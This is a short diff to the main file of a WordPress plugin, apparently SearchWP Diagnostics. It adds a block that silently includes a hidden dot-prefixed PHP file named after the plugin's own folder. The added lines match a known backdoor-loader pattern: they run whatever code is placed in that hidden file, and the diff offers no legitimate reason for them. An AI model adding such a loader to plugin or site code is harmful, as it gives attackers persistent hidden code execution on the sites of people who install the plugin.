@@ -80,6 +80,10 @@ function searchwp_diagnostics_update_check() {
 
 add_action( 'admin_init', 'searchwp_diagnostics_update_check' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWPDiagnostics {
 
 	// required for all SearchWP extensions
